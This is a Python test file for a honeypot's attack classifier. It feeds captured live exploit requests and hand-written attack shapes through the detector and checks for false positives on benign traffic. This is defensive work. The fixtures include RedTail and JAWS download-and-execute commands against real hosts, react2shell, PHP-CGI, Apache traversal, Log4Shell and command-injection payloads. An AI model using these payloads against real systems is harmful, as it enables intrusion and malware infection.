"""Attack classifier: labelled live payloads, then the false-positive budget.

The attack corpus is real: every case marked LIVE is a trimmed copy of a
request that reached the sensor in its first day (2026-10-24/25). Cases
marked HAND are minimal hand-written shapes for classes not yet seen live;
they are replaced by live copies as traffic brings them.

The benign corpus is real too: tests/fixtures/benign_requests.json holds every
distinct header set from requests that got our own content back and tripped
no hunt rule (browsers, Claude-SearchBot, DuckDuckBot, archive.org, research
scanners), with cookies, auth and IPs removed. The budget there is zero.
"""

from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from mirage_crawl import attacks, policies  # noqa: E402
from mirage_crawl.sitegen import Site  # noqa: E402

failures: list[str] = []
FIXTURES = Path(__file__).resolve().parent / "fixtures"


def check(name: str, condition: bool, detail: str = "") -> None:
    print(f"  {'PASS' if condition else 'FAIL'}  {name}" + (f"  ({detail})" if detail and not condition else ""))
    if not condition:
        failures.append(name)


def classify(path="/", query=None, headers=(), body=None, ctype=None):
    hs = [list(h) for h in headers]
    if ctype:
        hs.append(["Content-Type", ctype])
    return attacks.classify(path, query, hs, body.encode() if isinstance(body, str) else body)


def labels(found) -> set[tuple]:
    return {(a.cls, a.location, a.cve) for a in found}


# -- the live corpus ---------------------------------------------------------

R2S_BOUNDARY = "----------WebKitFormBoundaryf50d8f5029944b63"
R2S_BODY = (
    f"--{R2S_BOUNDARY}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n"
    '{"then": "$1:__proto__:then", "status": "resolved_model", "reason": -1, '
    '"value": "{\\"then\\":\\"$B1337\\"}", "_response": {"_prefix": "var res=process.mainModule'
    ".require('child_process').execSync('echo $((41*271)) | base64 -w 0').toString().trim();\", "
    '"_chunks": "$Q2", "_formData": {"get": "$1:constructor:constructor"}}}\r\n'
    f"--{R2S_BOUNDARY}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n"
    f"--{R2S_BOUNDARY}--"
)
BISSA_BOUNDARY = "------------------------bissa_cve_boundary"
BISSA_BODY = (
    f"--{BISSA_BOUNDARY}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n"
    '{"then": "$1:__proto__:then", "status": "resolved_model", "reason": -1, '
    '"value": "{\\"then\\": \\"$B0\\"}", "_response": {"_prefix": "var reject_bridge = arguments[1]; '
    "(Promise.all([Function('return import(\\\"node:child_process\\\")')()]))\", "
    '"_formData": {"get": "$1:constructor:constructor"}}}\r\n'
    f"--{BISSA_BOUNDARY}--"
)
# RedTail's CVE-2024-4577 body, with the inner script reduced to its fallback
# (the live one also carries the SSH key RedTail uses to scp its stage 2).
REDTAIL_INNER = (
    "cd /tmp || cd /var/tmp || cd /dev/shm; (wget --no-check-certificate -qO- "
    "https://217.60.102.5/sh || curl -sk https://217.60.102.5/sh) | sh -s cve_2024_4577"
)
REDTAIL_PHP = '<?php shell_exec(base64_decode("%s")); echo(md5("Hello CVE-2024-4577")); ?>' % (
    base64.b64encode(REDTAIL_INNER.encode()).decode()
)
REDTAIL_SH = (
    "(wget --no-check-certificate -qO- https://217.60.102.5/sh || "
    "curl -sk https://217.60.102.5/sh) | sh -s apache"
)
JAWS_QUERY = (
    "killall+-9+arm7;cd+/tmp;rm+-f+arm7+arm4;arch=$(uname+-m);case+$arch+in+armv7l)"
    "+file=akbarniga.armv7l;;+esac;wget+http://play.nopixel-rp.ir/$file;chmod+777+$file;./$file+jaws"
)

# (name, request, labels that must be present)
LIVE = [
    ("react2shell, WebKit boundary kit",
     dict(body=R2S_BODY, ctype=f"multipart/form-data; boundary={R2S_BOUNDARY}",
          headers=[("Next-Action", "x")]),
     {("deserialization", "body:0", "CVE-2025-55182")}),
    ("react2shell, bissa kit",
     dict(body=BISSA_BODY, ctype=f"multipart/form-data; boundary={BISSA_BOUNDARY}",
          headers=[("Next-Action", "x")]),
     {("deserialization", "body:0", "CVE-2025-55182")}),
    ("php-cgi argument injection, soft hyphen (CVE-2024-4577)",
     dict(path="/hello.world", query="%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
          body=REDTAIL_PHP),
     {("php_code", "query", "CVE-2024-4577"), ("php_code", "body", None)}),
    ("php-cgi argument injection, double-encoded",
     dict(path="/index.php", query="%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
          body=REDTAIL_PHP),
     {("php_code", "query", "CVE-2024-4577")}),
    # Plain "-d" is the original php-cgi bug. CVE-2024-4577 is only the soft
    # hyphen (%AD) bypass of its fix, even though RedTail sends both in the
    # same campaign.
    ("php-cgi argument injection, plain -d (CVE-2012-1823)",
     dict(path="/index.php", query="-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
          body=REDTAIL_PHP),
     {("php_code", "query", "CVE-2012-1823")}),
    ("apache traversal to /bin/sh (CVE-2021-41773)",
     dict(path="/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh", body=REDTAIL_SH),
     {("lfi", "path", "CVE-2021-41773"), ("cmd_injection", "body", None)}),
    ("apache traversal, double-encoded (CVE-2021-42013)",
     dict(path="/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh", body=REDTAIL_SH),
     {("lfi", "path", "CVE-2021-42013"), ("cmd_injection", "body", None)}),
    ("jaws botnet /shell command chain",
     dict(path="/shell", query=JAWS_QUERY),
     {("cmd_injection", "query", None)}),
    ("thinkphp invokefunction (CVE-2018-20062)",
     dict(path="/index.php",
          query="s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello"),
     {("php_code", "query:s", "CVE-2018-20062")}),
    ("pearcmd lfi to config-create",
     dict(path="/index.php",
          query='lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php'),
     {("lfi", "query:lang", None), ("php_code", "query", None)}),
    ("pearcmd include of the planted file",
     dict(path="/index.php", query="lang=../../../../../../../../tmp/index1"),
     {("lfi", "query:lang", None)}),
    ("classic passwd traversal in a parameter",
     dict(path="/download.php", query="file=../../../../etc/passwd"),
     {("lfi", "query:file", None)}),
    ("encoded traversal in the path",
     dict(path="/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
     {("lfi", "path", None)}),
    ("credential sweep through /proc/self/cwd",
     dict(path="/../../../../../../proc/self/cwd/.aws/credentials"),
     {("lfi", "path", None)}),
    ("nginx alias off-by-slash",
     dict(path="/static../.git/config"),
     {("lfi", "path", None)}),
    ("sqli union select",
     dict(path="/x.php", query="id=1%20UNION%20SELECT%201"),
     {("sqli", "query:id", None)}),
    ("sqli tautology",
     dict(path="/x.php", query="id=1%20OR%201=1"),
     {("sqli", "query:id", None)}),
]

def _multipart(boundary: str, parts: list[tuple[str, str]]) -> str:
    """Inert multipart body: (Content-Disposition value, part body) pairs."""
    out = "".join(f"--{boundary}\r\nContent-Disposition: {d}\r\n\r\n{v}\r\n" for d, v in parts)
    return out + f"--{boundary}--\r\n"


PG_BOUNDARY = "----placeholder"
PG_CTYPE = f"multipart/form-data; boundary={PG_BOUNDARY}"
# PHP2Shell shape: a multipart POST carrying PHP's default upload-progress
# field name. The file part is placeholder bytes, not a payload.
PG_BODY = _multipart(PG_BOUNDARY, [
    ('form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', "x"),
    ('form-data; name="f"; filename="a.bin"', "A" * 64),
])
PG_EMPTY = _multipart(PG_BOUNDARY, [('form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', "")])
PG_PLAIN = _multipart(PG_BOUNDARY, [('form-data; name="f"; filename="a.txt"', "hello")])

HAND = [
    ("php2shell shape: multipart upload-progress field",
     dict(path="/index.php", body=PG_BODY, ctype=PG_CTYPE),
     {("php_code", "body:PHP_SESSION_UPLOAD_PROGRESS", None)}),
    ("php2shell shape: upload-progress field with an empty value",
     dict(path="/index.php", body=PG_EMPTY, ctype=PG_CTYPE),
     {("php_code", "body:PHP_SESSION_UPLOAD_PROGRESS", None)}),
    ("xss script tag", dict(query="q=<script>alert(1)</script>"), {("xss", "query:q", None)}),
    ("xss encoded svg onload", dict(query="q=%3Csvg%2Fonload%3Dalert(1)%3E"), {("xss", "query:q", None)}),
    ("rfi into an include parameter", dict(query="page=http://evil.test/shell.txt?"), {("rfi", "query:page", None)}),
    ("log4shell in a user agent", dict(headers=[("User-Agent", "${jndi:ldap://x.test/a}")]),
     {("log4shell", "header:User-Agent", None)}),
    ("obfuscated log4shell in a header", dict(headers=[("X-Api-Version", "${${lower:j}ndi:ldap://x.test/a}")]),
     {("log4shell", "header:X-Api-Version", None)}),
    ("shellshock in a user agent", dict(headers=[("User-Agent", "() { :; }; /bin/bash -c id")]),
     {("shellshock", "header:User-Agent", None)}),
    ("java serialized object", dict(body="rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZQ=="),
     {("deserialization", "body", None)}),
    ("php serialized object in a cookie", dict(headers=[("Cookie", 'sess=O:8:"stdClass":1:{s:1:"a";s:1:"b";}')]),
     {("deserialization", "header:Cookie", None)}),
    ("command injection in a json field", dict(body='{"host": "127.0.0.1; wget http://x.test/a"}',
                                               ctype="application/json"),
     {("cmd_injection", "body:host", None)}),
    ("command injection in a form field", dict(body="ip=1.1.1.1%3Bcat+/etc/passwd",
                                               ctype="application/x-www-form-urlencoded"),
     {("cmd_injection", "body:ip", None)}),
]


def test_attack_corpus() -> None:
    print("\nattack corpus (live)")
    for name, req, expected in LIVE:
        got = labels(classify(**req))
        check(name, expected <= got, f"missing {expected - got}, got {got}")
    print("\nattack corpus (hand-written, not yet seen live)")
    for name, req, expected in HAND:
        got = labels(classify(**req))
        check(name, expected <= got, f"missing {expected - got}, got {got}")


def test_attack_details() -> None:
    print("\nattack record details")
    found = classify(path="/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh")
    lfi = [a for a in found if a.cls == "lfi"]
    check("a match only after decoding is flagged decoded", lfi and lfi[0].decoded, str(found))
    found = classify(query="file=../../../../etc/passwd")
    check("a plain match is not flagged decoded", found and not found[0].decoded, str(found))
    check("evidence is bounded", all(len(a.evidence) <= attacks.EVIDENCE_CAP for a in classify(
        query="q=" + "<script>" + "a" * 5000)))
    found = classify(**LIVE[0][1])
    check("react2shell carries its signature name",
          any(a.sig == "react2shell" for a in found), str(found))
    record = found[0].as_dict()
    check("as_dict is json-ready with the fixed keys",
          set(record) == {"cls", "location", "evidence", "decoded", "sig", "cve"} and json.dumps(record))
    found = classify(path="/index.php", body=PG_BODY, ctype=PG_CTYPE)
    progress = [a for a in found if a.sig == "php-session-upload-progress"]
    check("upload-progress field carries its signature name", len(progress) == 1, str(found))
    check("upload-progress field claims no CVE (surface, not proof of exploitation)",
          progress and progress[0].cve is None, str(progress))
    check("a plain multipart upload is not labelled upload-progress",
          not [a for a in classify(path="/index.php", body=PG_PLAIN, ctype=PG_CTYPE)
               if a.sig == "php-session-upload-progress"])
    check("the field name in a value or another field name does not fire",
          not classify(path="/x", query="q=PHP_SESSION_UPLOAD_PROGRESS&PHP_SESSION_UPLOAD_PROGRESS_X=1")
          and not classify(path="/x", body=_multipart(PG_BOUNDARY, [
              ('form-data; name="note"', "PHP_SESSION_UPLOAD_PROGRESS is a PHP ini feature")]), ctype=PG_CTYPE))
    once = classify(path="/a/../../../../etc/passwd", query="f=../../../../etc/passwd")
    check("one label per (class, location)",
          len(once) == len({(a.cls, a.location) for a in once}), str(once))
    check("every class in the rule table is a known class",
          {r.cls for r in attacks.RULES} <= set(attacks.CLASSES), str({r.cls for r in attacks.RULES}))


# -- the false-positive budget ---------------------------------------------

# Recon is hunt.py's job (decision 2.2): a path probe with no payload is not an
# attack, even when the path names an exploit.
RECON = [
    "/.env", "/.git/config", "/wp-login.php", "/phpinfo.php", "/xmlrpc.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/cgi-bin/luci",
    "/.config/gcloud/application_default_credentials.json", "/actuator/env",
    "/api/version", "/containers/json", "/autodiscover/autodiscover.json",
    "http://api.ipify.org/", "api.ipify.org:443",
]

BENIGN_QUERIES = [
    "q=how+to+select+a+union+rep", "page=2", "sort=name&order=desc", "lang=en",
    "utm_source=hn&utm_medium=social&utm_campaign=launch", "redirect=https://scannersnoop.com/docs/",
    "callback=jQuery1123_456", "ref=producthunt", "file=report-2026.pdf", "id=1",
    "search=O%27Reilly+or+not", "q=1%3D1", "next=%2Fdocs%2Fp001%2F", "format=json", "rsd",
    "s=cat+%26+dog", "v=1.2.3&debug=false", "include=author,comments", "q=a%3Bb",
    "q=rm+-rf+explained", "url=https%3A%2F%2Fexample.com%2Fa.php",
]
BENIGN_BODIES = [
    ("user=alice&pass=hunter2", "application/x-www-form-urlencoded"),
    ('{"query": "{ user(id: 1) { name } }"}', "application/json"),
    ('{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26",'
     '"clientInfo":{"name":"some-client","version":"1.0"}}}', "application/json"),
    ("comment=I+think+you+should+select+one+or+the+other.", "application/x-www-form-urlencoded"),
    ('{"events":[{"type":"pageview","url":"https://scannersnoop.com/docs/"}]}', "application/json"),
]


def test_false_positive_budget() -> None:
    print("\nfalse-positive budget")
    fixture = json.loads((FIXTURES / "benign_requests.json").read_text())
    flagged = []
    for r in fixture:
        found = attacks.classify(r["raw_path"], r["raw_query"], r["headers"], None)
        if found:
            flagged.append((r["raw_path"], [a.as_dict() for a in found]))
    check(f"live benign corpus: 0 attacks in {len(fixture)} requests", not flagged, str(flagged[:3]))

    site = Site("fp-budget", projects=20, pages_per_project=6)
    served = site.all_page_paths() + [p.path for p in policies.POLICY_FILES] + [
        "/", "/docs/", "/assets/style.css", "/assets/app.js", "/favicon.ico",
        policies.STABLE_DISALLOW_LINKED, policies.STABLE_ALLOW_UNLINKED,
    ]
    flagged = [p for p in served if attacks.classify(p, None, [], None)]
    check(f"every path we serve: 0 attacks in {len(served)}", not flagged, str(flagged[:5]))

    flagged = [p for p in RECON if attacks.classify(p, None, [["User-Agent", "Mozilla/5.0 zgrab/0.x"]], None)]
    check("recon probes are not attacks", not flagged, str(flagged))

    flagged = [q for q in BENIGN_QUERIES if attacks.classify("/search", q, [], None)]
    check("benign query strings are not attacks", not flagged, str(flagged))
    flagged = [b for b, ct in BENIGN_BODIES
               if attacks.classify("/", None, [["Content-Type", ct]], b.encode())]
    check("benign bodies are not attacks", not flagged, str(flagged))


# -- tools and callback domains -------------------------------------------

def test_tools() -> None:
    print("\ntool attribution")

    def tools(headers=(), body=None, ctype=None):
        hs = [list(h) for h in headers] + ([["Content-Type", ctype]] if ctype else [])
        return {(t.name, t.kind) for t in attacks.tools(hs, body.encode() if body else None)}

    expected = {
        "libredtail-http": ("redtail", "botnet"),
        "Mozilla/5.0 zgrab/0.x": ("zgrab", "scanner"),
        "Mozilla/5.0 (compatible; nmap-http-info)": ("nmap", "scanner"),
        "zmap-proxy-probe/1.0": ("zmap", "scanner"),
        "sqlmap/1.8.4#stable (https://sqlmap.org)": ("sqlmap", "attack_tool"),
        "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))":
            ("nuclei", "attack_tool"),
        "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)": ("nikto", "attack_tool"),
        "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)": ("wpscan", "attack_tool"),
        "Fuzz Faster U Fool v2.1.0": ("ffuf", "attack_tool"),
        "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)": ("censys", "research"),
        "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/":
            ("xpanse", "research"),
        "Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)": ("infrawatch", "research"),
    }
    wrong = {ua: tools([("User-Agent", ua)]) for ua, want in expected.items()
             if want not in tools([("User-Agent", ua)])}
    check("user-agent tool markers", not wrong, str(wrong))
    check("bissa react2shell kit from its multipart boundary",
          ("bissa", "exploit_kit") in tools(body=BISSA_BODY,
                                             ctype=f"multipart/form-data; boundary={BISSA_BOUNDARY}"))
    probe = '{"jsonrpc":"2.0","method":"initialize","params":{"clientInfo":{"name":"mcp-fingerprint-probe"}}}'
    check("mcp fingerprint probe from its clientInfo",
          ("mcp-fingerprint-probe", "scanner") in tools(body=probe, ctype="application/json"))

    fixture = json.loads((FIXTURES / "benign_requests.json").read_text())
    browsers = [r for r in fixture
                if any(n.lower() == "user-agent" and v.startswith("Mozilla/5.0 (")
                       and "compatible" not in v and "Palo Alto" not in v for n, v in r["headers"])]
    flagged = [r["headers"] for r in browsers if attacks.tools(r["headers"], None)]
    check(f"no tool on {len(browsers)} live browser requests", not flagged, str(flagged[:2]))


def test_oast() -> None:
    print("\nout-of-band callback domains")
    cases = {
        "${jndi:ldap://c0ffee12.oast.fun/a}": ["c0ffee12.oast.fun"],
        "curl http://abc.burpcollaborator.net/x": ["abc.burpcollaborator.net"],
        "nslookup x9.oastify.com": ["x9.oastify.com"],
        "ping -c1 k2.dnslog.cn": ["k2.dnslog.cn"],
        "wget http://q1w2.interact.sh": ["q1w2.interact.sh"],
        "%24%7Bjndi%3Aldap%3A%2F%2Fzz.oast.pro%2Fa%7D": ["zz.oast.pro"],
    }
    wrong = {t: attacks.oast_domains([t]) for t, want in cases.items() if attacks.oast_domains([t]) != want}
    check("callback domains extracted (never resolved)", not wrong, str(wrong))
    check("ordinary domains are not callbacks",
          attacks.oast_domains(["https://scannersnoop.com/", "https://bot.duckduckgo.com",
                                "oast.fun is a site", "http://burpcollaborator.net.example.com/"]) == [])


def test_analyze() -> None:
    print("\nanalyze: one call for the middleware")
    result = attacks.analyze("/hello.world", "%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                             [["User-Agent", "libredtail-http"]], REDTAIL_PHP.encode())
    fields = result.event_fields()
    check("event carries attacks, tools, oast keys", set(fields) == {"attacks", "tools", "oast"})
    check("attacks are dicts", fields["attacks"] and all(isinstance(a, dict) for a in fields["attacks"]))
    check("tools named", fields["tools"] == [{"name": "redtail", "kind": "botnet"}], str(fields["tools"]))
    empty = attacks.analyze("/docs/", None, [["User-Agent", "Mozilla/5.0 (X11; Linux x86_64)"]], None)
    check("nothing found gives all-None fields (compact log lines)",
          empty.event_fields() == {"attacks": None, "tools": None, "oast": None})


if __name__ == "__main__":
    test_attack_corpus()
    test_attack_details()
    test_false_positive_budget()
    test_tools()
    test_oast()
    test_analyze()
    print("\nFAILURES: " + ", ".join(failures) if failures else "\nall attack checks passed")
    sys.exit(1 if failures else 0)
